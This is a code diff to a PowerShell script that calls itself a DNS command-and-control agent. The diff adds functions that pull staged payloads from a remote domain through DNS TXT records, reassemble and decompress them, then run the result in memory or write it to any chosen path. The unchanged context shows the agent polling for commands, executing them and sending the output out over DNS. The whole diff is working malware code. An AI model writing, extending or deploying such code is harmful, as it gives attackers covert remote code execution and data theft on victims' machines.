@@ -1,6 +1,7 @@
 $BaseDomain = "domain.com"
 $CommandSubdomain = "cmd"
 $DataSubdomain = "data"
+$DownloadSubdomain = "dl"
 $SleepTimeSeconds = 15
 $ExfilChunkSize = 50
 
@@ -11,6 +12,161 @@ function HexEncode([string]$Text) {
         $HexString += '{0:x2}' -f [int][char]$Char
     }
     return $HexString
+}
+
+function Decompress-GzipData([byte[]]$CompressedData) {
+    $InputStream = New-Object System.IO.MemoryStream(,$CompressedData)
+    $GzipStream = New-Object System.IO.Compression.GzipStream($InputStream, [System.IO.Compression.CompressionMode]::Decompress)
+    $OutputStream = New-Object System.IO.MemoryStream
+    $Buffer = New-Object byte[] 4096
+    while (($Read = $GzipStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+        $OutputStream.Write($Buffer, 0, $Read)
+    }
+    $GzipStream.Close()
+    $InputStream.Close()
+    return $OutputStream.ToArray()
+}
+
+function Get-StagedFile($FileId) {
+    Write-Host "Downloading staged file: $FileId" -ForegroundColor Yellow
+    
+    $MetaFqdn = "0.$FileId.$DownloadSubdomain.$BaseDomain"
+    
+    try {
+        $MetaRecord = Resolve-DnsName -Name $MetaFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
+        $MetaData = ($MetaRecord | Where-Object { $_.Type -eq "TXT" }).Strings -join ''
+        
+        $MetaParts = $MetaData.Split('|')
+        if ($MetaParts.Count -lt 4) {
+            Write-Host "Invalid metadata format" -ForegroundColor Red
+            return $null
+        }
+        
+        $Action = $MetaParts[0]
+        $TotalFragments = [int]$MetaParts[1]
+        $Checksum = $MetaParts[2]
+        $FileName = $MetaParts[3]
+
+        $Destination = if ($MetaParts.Count -ge 5) { $MetaParts[4] -replace '\\\\', '\' } else { "" }
+        
+        Write-Host "  Action: $Action, Fragments: $TotalFragments, File: $FileName" -ForegroundColor Cyan
+        
+    } catch {
+        Write-Host "Error fetching metadata: $_" -ForegroundColor Red
+        return $null
+    }
+    
+    $EncodedData = ""
+    
+    for ($i = 1; $i -le $TotalFragments; $i++) {
+        $FragmentFqdn = "$i.$FileId.$DownloadSubdomain.$BaseDomain"
+        
+        $MaxRetries = 3
+        $RetryCount = 0
+        $Success = $false
+        
+        while (-not $Success -and $RetryCount -lt $MaxRetries) {
+            $RetryCount++
+            Write-Host "  Fetching fragment $i/$TotalFragments (Attempt $RetryCount)" -ForegroundColor DarkGray
+            
+            try {
+                $FragmentRecord = Resolve-DnsName -Name $FragmentFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
+                $FragmentData = ($FragmentRecord | Where-Object { $_.Type -eq "TXT" }).Strings -join ''
+                $EncodedData += $FragmentData
+                $Success = $true
+            } catch {
+                Write-Host "    Failed attempt $RetryCount" -ForegroundColor Red
+                if ($RetryCount -lt $MaxRetries) {
+                    Start-Sleep -Milliseconds 500
+                }
+            }
+        }
+        
+        if (-not $Success) {
+            Write-Host "  FAILED to fetch fragment $i after $MaxRetries attempts" -ForegroundColor Red
+            return $null
+        }
+        
+        Start-Sleep -Milliseconds 100
+    }
+    
+    Write-Host "  All fragments received. Decompressing..." -ForegroundColor Cyan
+    
+    try {
+        $CompressedBytes = [System.Convert]::FromBase64String($EncodedData)
+        $DecompressedBytes = Decompress-GzipData $CompressedBytes
+        
+        $ReceivedChecksum = ([System.BitConverter]::ToString((New-Object System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash($DecompressedBytes)) -replace '-','').Substring(0,8).ToLower()
+        
+        if ($ReceivedChecksum -ne $Checksum) {
+            Write-Host "  Checksum mismatch! Expected: $Checksum, Got: $ReceivedChecksum" -ForegroundColor Red
+            return $null
+        }
+        
+        Write-Host "  Checksum verified: $ReceivedChecksum" -ForegroundColor Green
+        
+        return @{
+            Action = $Action
+            Data = $DecompressedBytes
+            FileName = $FileName
+            Destination = $Destination
+        }
+        
+    } catch {
+        Write-Host "  Error decompressing data: $_" -ForegroundColor Red
+        return $null
+    }
+}
+
+function Execute-StagedFile($FileData) {
+    $Action = $FileData.Action
+    $Data = $FileData.Data
+    $FileName = $FileData.FileName
+    $Destination = $FileData.Destination
+    
+    if ($Action -eq "EXEC") {
+        Write-Host "Executing file in memory: $FileName" -ForegroundColor Yellow
+        
+        try {
+            $Script = [System.Text.Encoding]::UTF8.GetString($Data)
+            
+            $ScriptBlock = [ScriptBlock]::Create($Script)
+            $Output = & $ScriptBlock 2>&1 | Out-String
+            
+            if ([string]::IsNullOrWhiteSpace($Output)) {
+                return "[EXEC] Script '$FileName' executed successfully (no output)"
+            }
+            return $Output.Trim()
+            
+        } catch {
+            return "[EXEC ERROR] Script '$FileName' failed: $($_.Exception.Message)"
+        }
+        
+    } elseif ($Action -eq "PUSH") {
+        try {
+            $FinalPath = $Destination
+            if (Test-Path $Destination -PathType Container) {
+                $FinalPath = Join-Path -Path $Destination -ChildPath $FileName
+            } elseif ($Destination.EndsWith('\') -or $Destination.EndsWith('/')) {
+                $FinalPath = Join-Path -Path $Destination -ChildPath $FileName
+            }
+            
+            Write-Host "Saving file to: $FinalPath" -ForegroundColor Yellow
+            
+            $ParentDir = Split-Path -Parent $FinalPath
+            if ($ParentDir -and -not (Test-Path $ParentDir)) {
+                New-Item -ItemType Directory -Path $ParentDir -Force | Out-Null
+            }
+            
+            [System.IO.File]::WriteAllBytes($FinalPath, $Data)
+            return "File saved successfully to: $FinalPath ($($Data.Length) bytes)"
+        } catch {
+            return "Error saving file: $($_.Exception.Message)"
+        }
+        
+    } else {
+        return "Unknown action: $Action"
+    }
 }
 
 function Do-Exfiltrate($SessionId, $CommandId, $Result) {
@@ -120,6 +276,36 @@ function Execute-Command($Command) {
     return $ExecutionResult.Trim()
 }
 
+function Process-Command($CommandData) {
+    $Command = $CommandData.Command
+    
+    if ($Command -match "^EXEC:([a-f0-9]+)$") {
+        $FileId = $matches[1]
+        Write-Host "EXEC command detected. File ID: $FileId" -ForegroundColor Cyan
+        
+        $FileData = Get-StagedFile $FileId
+        if ($FileData) {
+            return Execute-StagedFile $FileData
+        } else {
+            return "Failed to download staged file: $FileId"
+        }
+        
+    } elseif ($Command -match "^PUSH:([a-f0-9]+)$") {
+        $FileId = $matches[1]
+        Write-Host "PUSH command detected. File ID: $FileId" -ForegroundColor Cyan
+        
+        $FileData = Get-StagedFile $FileId
+        if ($FileData) {
+            return Execute-StagedFile $FileData
+        } else {
+            return "Failed to download staged file: $FileId"
+        }
+        
+    } else {
+        return Execute-Command $Command
+    }
+}
+
 Write-Host "Starting PowerShell DNS C2 Agent..." -ForegroundColor Green
 
 $AgentID = $env:COMPUTERNAME
@@ -134,7 +320,7 @@ while ($true) {
         $LastCommandId = $CheckInResult.Id
         Write-Host "New command detected (ID: $LastCommandId)" -ForegroundColor Cyan
         
-        $Result = Execute-Command $CheckInResult.Command
+        $Result = Process-Command $CheckInResult
         Do-Exfiltrate $AgentID $LastCommandId $Result
     } else {
         Write-Host "No new command. Agent alive." -ForegroundColor DarkGray
